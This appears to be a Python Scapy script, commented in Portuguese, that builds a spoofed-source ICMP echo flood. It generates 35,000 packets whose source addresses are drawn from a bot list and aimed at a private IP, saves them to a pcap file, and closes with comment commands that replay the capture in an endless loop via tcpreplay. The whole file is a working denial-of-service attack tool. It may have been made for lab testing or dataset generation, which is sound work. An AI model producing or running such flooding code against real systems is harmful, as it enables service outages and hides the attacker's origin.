from scapy.all import *
import random
import ipaddress

# Ataque ICMP Flood, sem payload (mínimo), spoofing de IP.
TARGET_IP = "192.168.100.2"
BOTFILE = "bots.txt"
TARGET_MAC = "ff:ff:ff:ff:ff:ff"
PCAP_FILENAME = "icmp_flood_echo.pcap"
NUM_PACKETS = 35000

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_flood_attack():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    numero_de_pacotes_enviados = 0

    while numero_de_pacotes_enviados < NUM_PACKETS:
        source_ip = random.choice(bot_ips)
        ethernet_layer = Ether(dst=TARGET_MAC)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        icmp_layer = ICMP(type=8, code=0)  # Echo Request, sem payload
        packet = ethernet_layer / ip_layer / icmp_layer
        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

    print(f"Gerando arquivo PCAP com {numero_de_pacotes_enviados} pacotes...")
    wrpcap(PCAP_FILENAME, lista_de_pacotes)
    print(f"Arquivo PCAP '{PCAP_FILENAME}' gerado com sucesso.")

if __name__ == "__main__":
    run_icmp_flood_attack()

# sudo PYTHONPATH=$HOME/scapy python3 simple_udp_flood.py
# sudo tcpreplay -i enp0s3 -t -l 0 icmp_flood_echo.pcap
